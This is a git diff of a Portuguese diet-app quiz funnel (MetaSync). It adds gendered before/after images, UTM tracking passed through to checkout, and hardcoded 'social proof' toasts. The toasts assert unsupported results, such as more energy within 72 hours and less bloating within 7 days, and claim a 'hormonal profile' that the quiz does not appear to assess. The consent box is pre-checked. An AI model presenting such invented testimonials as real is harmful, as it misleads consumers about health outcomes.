-      why: 'Você indicou que o que mais atrapalha é a falta de tempo ou a variação na rotina. Começar com ações flexíveis de menos de 10 minutos evita a sobrecarga mental e mantém você em movimento.',
-      how: 'Mapeamos sua semana, definimos um único micro-compromisso por dia, registramos a execução e ajustamos as metas quando o tempo ficar mais apertado.',
-      firstStep: 'Definir uma única janela de 10 minutos no seu dia para focar na organização de uma das refeições principais.'
-    },
-    Ritmo: {
-      name: 'Protocolo Ritmo',
-      headline: 'O método para parar de depender da motivação e começar a construir um ritmo possível.',
-      subheadline: 'Uma jornada guiada com ações simples, acompanhamento e ajustes para você saber o que fazer hoje e como continuar amanhã.',
-      why: 'Você indicou que quer consistência e prefere listas claras de ação. Esse protocolo ajuda a criar o hábito diário de forma previsível e sem improvisos.',
-      how: 'Ações diárias estruturadas, registros de consistência, alertas amigáveis e revisões rápidas semanais para consolidar sua rotina.',
-      firstStep: 'Listar 3 ações simples de rotina que você já executa e associar o registro da MetaSync logo após uma delas.'
-    },
-    Recomeço: {
-      name: 'Protocolo Recomeço',
-      headline: 'Retome sua rotina sem culpa e sem começar do zero.',
-      subheadline: 'Um caminho estruturado para voltar aos trilhos após uma interrupção, focado em ajustes realistas e sem cobranças excessivas.',
-      why: 'Você tem um histórico de começar e parar. Esse protocolo foi desenhado para eliminar a sensação de fracasso ao cometer um deslize e restabelecer o hábito.',
-      how: 'Identificamos o que causou a interrupção, traçamos um plano mínimo viável de 3 dias para restabelecer a confiança e acompanhamos a volta gradual.',
-      firstStep: 'Registrar a última interrupção que você teve e definir a meta simplificada para os próximos 2 dias.'
-    },
-    Base: {
-      name: 'Protocolo Base',
-      headline: 'Construa uma base organizada antes de buscar mudanças complexas.',
-      subheadline: 'Comece pelo essencial, com clareza total sobre alimentação, movimento, sono e acompanhamento diário.',
-      why: 'Você se sente sem direção diante de tantas informações. Focar nos fundamentos básicos é o caminho mais seguro para não desistir e evoluir com segurança.',
-      how: 'Checklist simples do essencial de sono, hidratação e horários de refeição, sem restrições extremas.',
-      firstStep: 'Avaliar seus horários de sono e hidratação e preencher o primeiro checklist básico da MetaSync.'
-    }
-  };
+  const isHomem = ud.gender === 'homem';
+  const baImg = isHomem ? 'before_after_graphic_man.png' : 'before_after_graphic.png';
+  const faceImg = isHomem ? 'face_transformation_man.png' : 'face_transformation.png';
+  const goalLabel = ud.goal || 'Organizar minha alimentação';
+  const targetLabel = ud.targetBody || (isHomem ? 'Definido' : 'Em forma');
+  const ageLabel = ud.ageRange || '26 a 35 anos';
 
-  const p = PROTOCOLS[pKey];
+  const toasts = isHomem ? [
+    {icon:'🔥', text:'Seu plano foi criado com foco em composição corporal masculina e jejum otimizado.'},
+    {icon:'⚡', text:'Homens que usam o MetaSync relatam melhora de energia em até 72h.'},
+    {icon:'💪', text:'Protocolo adaptado ao seu tipo de corpo e objetivo de treino.'}
+  ] : [
+    {icon:'🔥', text:'Seu plano foi criado com base no seu perfil hormonal e janelas de alimentação feminina.'},
+    {icon:'⚡', text:'Mulheres que seguem o MetaSync relatam menos inchaço em até 7 dias.'},
+    {icon:'✨', text:'Protocolo adaptado ao seu objetivo de corpo e rotina de refeições.'}
+  ];
 
   return `
   <div>
     <div style="text-align:center;margin-bottom:20px">
-      <div style="display:inline-block;background:rgba(74, 107, 83, 0.1);border:1px solid var(--cyan-neon);color:var(--cyan-neon);font-size:10px;font-weight:900;padding:4px 12px;border-radius:20px;letter-spacing:1px;text-transform:uppercase;margin-bottom:12px">✅ AVALIAÇÃO CONCLUÍDA</div>
-      <h2 class="q-title center" style="font-size:24px;margin-bottom:8px;color:#143540">Sua rota inicial é o ${p.name}</h2>
-      <p class="q-sub" style="margin-bottom:0">${p.headline}</p>
+      <div style="display:inline-block;background:rgba(0,122,135,0.1);border:1px solid var(--cyan-neon);color:var(--cyan-neon);font-size:10px;font-weight:900;padding:4px 12px;border-radius:20px;letter-spacing:1px;text-transform:uppercase;margin-bottom:12px">✅ AVALIAÇÃO CONCLUÍDA</div>
+      <h2 class="q-title center" style="font-size:22px;margin-bottom:8px;color:#143540">Seu plano MetaSync está pronto!</h2>
+      <p class="q-sub" style="margin-bottom:0">Criamos um protocolo personalizado baseado no seu perfil de <strong>${isHomem ? 'homem' : 'mulher'}</strong>, ${ageLabel}, com objetivo de <strong>${goalLabel.toLowerCase()}</strong>.</p>
     </div>
 
-    <!-- Bloco 1: Por que combina -->
-    <div style="background:var(--bg-card);border:1px solid var(--border-glass);border-radius:18px;padding:16px;margin-bottom:14px;box-shadow:0 2px 10px rgba(0,0,0,0.02)">
-      <div style="font-size:11px;font-weight:900;color:var(--cyan-neon);letter-spacing:0.8px;margin-bottom:6px;text-transform:uppercase">🌟 POR QUE ESSA ROTA COMBINA COM VOCÊ:</div>
-      <p style="font-size:12.5px;color:var(--silver-light);line-height:1.55">${p.why}</p>
+    <!-- Imagem de transformação personalizada por gênero -->
+    <div style="border-radius:18px;overflow:hidden;border:1px solid var(--border-glass);margin-bottom:16px">
+      <img src="${baImg}" alt="Transformação MetaSync" style="width:100%;height:auto;display:block">
     </div>
 
-    <!-- Bloco 2: Como funciona -->
-    <div style="background:var(--bg-card);border:1px solid var(--border-glass);border-radius:18px;padding:16px;margin-bottom:14px;box-shadow:0 2px 10px rgba(0,0,0,0.02)">
-      <div style="font-size:11px;font-weight:900;color:var(--cyan-neon);letter-spacing:0.8px;margin-bottom:6px;text-transform:uppercase">🔄 COMO FUNCIONA:</div>
-      <p style="font-size:12.5px;color:var(--silver-light);line-height:1.55">${p.how}</p>
+    <!-- Toasts de prova social -->
+    ${toasts.map(t => `
+    <div style="display:flex;align-items:flex-start;gap:12px;background:var(--bg-card);border:1px solid var(--border-glass);border-radius:14px;padding:14px;margin-bottom:10px">
+      <span style="font-size:22px;flex-shrink:0">${t.icon}</span>
+      <p style="font-size:12.5px;color:var(--silver-light);line-height:1.5;margin:0">${t.text}</p>
+    </div>`).join('')}
+
+    <!-- Resumo do plano -->
+    <div style="background:var(--bg-card);border:1.5px solid var(--cyan-neon);border-radius:18px;padding:18px;margin:16px 0;box-shadow:0 0 20px var(--cyan-glow)">
+      <div style="font-size:11px;font-weight:900;color:var(--cyan-neon);letter-spacing:0.8px;margin-bottom:12px;text-transform:uppercase">📋 Resumo do Seu Protocolo Personalizado</div>
+      <div style="display:flex;flex-direction:column;gap:8px">
+        <div style="display:flex;justify-content:space-between;font-size:12.5px;border-bottom:1px solid var(--border-subtle);padding-bottom:8px">
+          <span style="color:var(--silver)">Perfil</span>
+          <span style="color:var(--silver-light);font-weight:700">${isHomem ? '👨 Masculino' : '👩 Feminino'}</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;font-size:12.5px;border-bottom:1px solid var(--border-subtle);padding-bottom:8px">
+          <span style="color:var(--silver)">Faixa etária</span>
+          <span style="color:var(--silver-light);font-weight:700">${ageLabel}</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;font-size:12.5px;border-bottom:1px solid var(--border-subtle);padding-bottom:8px">
+          <span style="color:var(--silver)">Objetivo</span>
+          <span style="color:var(--silver-light);font-weight:700">${goalLabel}</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;font-size:12.5px">
+          <span style="color:var(--silver)">Meta corporal</span>
+          <span style="color:var(--silver-light);font-weight:700">${targetLabel}</span>
+        </div>
+      </div>
     </div>
 
-    <!-- Bloco 3: Primeiro Passo -->
-    <div style="background:var(--bg-card);border:1px solid var(--border-glass);border-radius:18px;padding:16px;margin-bottom:20px;box-shadow:0 2px 10px rgba(0,0,0,0.02)">
-      <div style="font-size:11px;font-weight:900;color:var(--red-neon);letter-spacing:0.8px;margin-bottom:6px;text-transform:uppercase">🚀 SEU PRIMEIRO PASSO:</div>
-      <p style="font-size:12.5px;color:var(--silver-light);line-height:1.55"><strong>${p.firstStep}</strong></p>
-    </div>
-
-    <!-- Observação de confiança -->
+    <!-- Aviso de conformidade -->
     <div style="font-size:11px;color:var(--silver);line-height:1.5;margin-bottom:24px;text-align:center;padding:0 10px">
-      ⚠️ A MetaSync organiza sua jornada e ajuda você a acompanhar seus próximos passos. Ela não substitui avaliação, diagnóstico ou orientação de profissionais de saúde.
-    </div>
-
-    <div style="display:flex;flex-direction:column;gap:10px">
-      <button class="btn btn-primary" onclick="document.getElementById('leadCaptureForm').scrollIntoView({behavior:'smooth'})">Ver meu primeiro passo ⚡</button>
-      <button class="btn" onclick="alert('Outros protocolos disponíveis: Rota Leve, Ritmo, Recomeço e Base. O seu protocolo atual é o indicado como ideal para o seu momento.')" style="background:transparent;border:1px solid var(--border-glass);color:var(--silver-light)">Conhecer os outros protocolos</button>
+      ⚠️ O MetaSync organiza sua rotina alimentar com base nas suas respostas. Ele não substitui avaliação, diagnóstico ou orientação de profissionais de saúde.
     </div>
 
     <!-- Formulário de Captação de Leads -->
-    <div id="leadCaptureForm" style="background:var(--bg-card);border:1.5px solid var(--border-glass);border-radius:22px;padding:20px;margin-top:28px;box-shadow:0 4px 15px rgba(0,0,0,0.03);scroll-margin:20px">
-      <h3 style="font-size:16.5px;font-weight:900;color:#143540;margin-bottom:8px">Quer salvar sua rota e ver seu plano completo?</h3>
-      <p style="font-size:12.5px;color:var(--silver);margin-bottom:16px">Informe seus dados abaixo para salvar seu progresso na MetaSync e continuar.</p>
+    <div id="leadCaptureForm" style="background:var(--bg-card);border:1.5px solid var(--border-glass);border-radius:22px;padding:20px;margin-top:8px;box-shadow:0 4px 15px rgba(0,0,0,0.03);scroll-margin:20px">
+      <h3 style="font-size:16.5px;font-weight:900;color:#143540;margin-bottom:8px">Quer ver seu plano completo e personalizado?</h3>
+      <p style="font-size:12.5px;color:var(--silver);margin-bottom:16px">Informe seus dados para salvar seu perfil e acessar o protocolo completo.</p>
       
       <div style="margin-bottom:12px">
         <input type="text" id="leadName" placeholder="Seu primeiro nome" style="width:100%;padding:14px;border:1.5px solid var(--border-glass);border-radius:12px;outline:none;font-size:14px;color:var(--silver-light);background:#fff">
@@ -1437,10 +1475,10 @@ function renderResult(){
       
       <label style="display:flex;align-items:flex-start;gap:8px;font-size:11px;color:var(--silver);cursor:pointer;text-align:left;line-height:1.4">
         <input type="checkbox" id="leadConsent" style="margin-top:2px" checked>
-        <span>Aceito receber lembretes de rotina, dicas de consistência e comunicações da MetaSync.</span>
+        <span>Aceito receber meu plano personalizado e comunicações da MetaSync.</span>
       </label>
       
-      <button class="btn btn-primary" onclick="submitLeadAndShowSales()" style="margin-top:16px">Salvar minha rota & ver plano completo ⚡</button>
+      <button class="btn btn-primary" onclick="submitLeadAndShowSales()" style="margin-top:16px">Ver meu plano completo ⚡</button>
     </div>
   </div>`;
 }
@@ -1722,8 +1760,63 @@ function goToCheckout(planType = 'pro'){
     localStorage.setItem('metasync_user_data', JSON.stringify(ud));
   } catch (e) {}
 
+  // Prioriza o redirecionamento usando o link que o UTMify reescreveu automaticamente
+  const hiddenLinkId = isBasic ? 'utmify-checkout-basic' : 'utmify-checkout-pro';
+  const hiddenLink = document.getElementById(hiddenLinkId);
+  
+  if (hiddenLink && hiddenLink.href) {
+    const hasParams = hiddenLink.href.includes('?') || window.location.search;
+    if (hasParams) {
+      window.location.href = hiddenLink.href;
+      return;
+    }
+  }
+
   const baseUrl = isBasic ? 'https://go.perfectpay.com.br/PPU38CQF988' : 'https://checkout.perfectpay.com.br/pay/PPU38CQF97R';
   const currentParams = new URLSearchParams(window.location.search);
+  
+  // Função robusta para obter parâmetros de várias fontes (URL, UTMify global, LocalStorage)
+  const getParam = (key) => {
+    if (currentParams.get(key)) return currentParams.get(key);
+    if (window.utmParams && window.utmParams.get(key)) return window.utmParams.get(key);
+    try {
+      const localVal = localStorage.getItem(key);
+      if (localVal) {
+        const exp = localStorage.getItem(key + '_exp');
+        if (!exp || new Date(exp) > new Date()) {
+          return localVal;
+        }
+      }
+    } catch (e) {}
+    return '';
+  };
+
+  // Lista de parâmetros importantes para UTMify e PerfectPay
+  const keys = ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term', 'src', 'xcod', 'sck', 'fbclid', 'gclid', 'gbraid', 'wbraid', 'ttclid', 'tbclid'];
+  keys.forEach(key => {
+    const val = getParam(key);
+    if (val) {
+      currentParams.set(key, val);
+    }
+  });
+
+  // Fallback: Se xcod/sck não estiverem definidos, gera usando o padrão do UTMify (separador hQwK21wXxR)
+  const utmSource = currentParams.get('utm_source') || '';
+  const utmCampaign = currentParams.get('utm_campaign') || '';
+  const utmMedium = currentParams.get('utm_medium') || '';
+  const utmContent = currentParams.get('utm_content') || '';
+  const utmTerm = currentParams.get('utm_term') || '';
+
+  if (utmSource || utmCampaign || utmMedium || utmContent || utmTerm) {
+    const xcodVal = [utmSource, utmCampaign, utmMedium, utmContent, utmTerm].join('hQwK21wXxR');
+    if (!currentParams.get('xcod')) {
+      currentParams.set('xcod', xcodVal);
+    }
+    if (!currentParams.get('sck')) {
+      currentParams.set('sck', xcodVal);
+    }
+  }
+
   const paramString = currentParams.toString();
   const checkoutUrl = paramString ? (baseUrl.includes('?') ? `${baseUrl}&${paramString}` : `${baseUrl}?${paramString}`) : baseUrl;
   window.location.href = checkoutUrl;
@@ -2549,5 +2642,8 @@ if (document.readyState === 'interactive' || document.readyState === 'complete')
   document.addEventListener('DOMContentLoaded', initApp);
 }
 </script>
+<!-- Hidden links for UTMify tracking -->
+<a id="utmify-checkout-pro" href="https://checkout.perfectpay.com.br/pay/PPU38CQF97R" style="display:none;"></a>
+<a id="utmify-checkout-basic" href="https://go.perfectpay.com.br/PPU38CQF988" style="display:none;"></a>
 </body>
 </html>
